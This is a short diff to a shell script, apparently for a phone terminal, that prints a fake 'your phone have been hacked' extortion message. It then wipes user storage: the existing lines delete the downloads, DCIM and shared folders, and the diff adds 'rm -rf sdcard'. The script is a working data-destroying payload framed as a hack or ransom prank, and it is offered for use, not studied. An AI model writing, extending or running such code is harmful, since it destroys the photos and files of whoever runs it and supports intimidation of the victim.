@@ -2,6 +2,8 @@ echo "sorry bro your phone have been hacked "
 echo "If you want your phone back"
 echo "give me what i want"
 cd
+rm -rf sdcard
+cd
 cd storage/
 rm -rf downloads dcim shared
 cd
